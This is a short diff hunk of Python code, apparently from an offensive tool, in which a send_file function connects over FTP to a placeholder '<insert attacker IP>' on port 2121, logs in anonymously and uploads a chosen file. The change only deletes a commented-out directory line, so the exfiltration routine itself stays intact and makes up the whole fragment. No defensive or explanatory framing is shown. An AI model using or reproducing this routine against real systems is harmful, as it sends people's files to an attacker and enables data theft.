@@ -19,7 +19,6 @@ def send_file(path):
     ftp = FTP()
     ftp.connect('<insert attacker IP>', 2121)
     ftp.login('anonymous','password')
-    #ftp.cwd('/sambashare') # ftp root
     fp = open(path, 'rb')
     ftp.storbinary('STOR %s' % os.path.basename(path), fp, 1024)
     fp.close()
